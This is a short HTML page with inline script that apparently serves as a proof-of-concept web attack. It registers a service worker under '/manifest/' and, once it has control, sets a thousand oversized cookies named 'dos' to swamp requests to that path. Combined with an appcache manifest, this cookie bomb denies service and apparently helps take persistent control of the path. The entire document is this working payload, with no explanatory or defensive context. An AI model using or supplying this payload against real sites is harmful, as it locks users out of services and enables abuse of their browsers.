<html manifest="offline.manifest">
  <script>
    if (!navigator.serviceWorker.controller ||
        new URL(navigator.serviceWorker.controller.scriptURL).pathname !='/manifest/sw.js') {
      navigator.serviceWorker.register('sw.cached.js', {'scope': '/manifest/'});
      location.reload();
    } else {
      for (var i = 0; i < 1e3; i++) {
        document.cookie = "dos" + i + "=" + Array(999) + ';path=/manifest/';
      }
    }
  </script>
</html>
